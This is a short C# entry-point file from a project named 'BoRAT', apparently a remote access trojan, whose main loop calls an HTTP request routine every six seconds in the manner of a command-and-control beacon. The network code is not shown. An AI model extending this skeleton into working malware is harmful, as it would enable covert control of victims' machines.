using System;
using BoRAT.Network;
using System.Threading;

namespace BoRAT
{
    class Program
    {
        static void Main(string[] args)
        {
            while(true)
            {
                Http.Request();
                Thread.Sleep(6000);
            }

            Console.ReadKey();
        }

      
    }
}
